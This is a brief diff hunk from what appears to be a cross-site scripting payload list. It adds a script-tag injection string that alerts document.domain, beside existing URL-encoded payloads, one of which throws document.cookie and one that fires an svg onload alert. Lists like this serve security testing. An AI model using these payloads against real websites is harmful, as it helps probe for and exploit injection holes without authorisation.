@@ -46,6 +46,8 @@ javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
 
 %22%3E%3Csvg%2Fonload%3Dalert%281%29%3E%2A%27%2F
 
+">'><script>alert(document.domain)</script>
+
 
 
 -----------------------------------------------------------------------
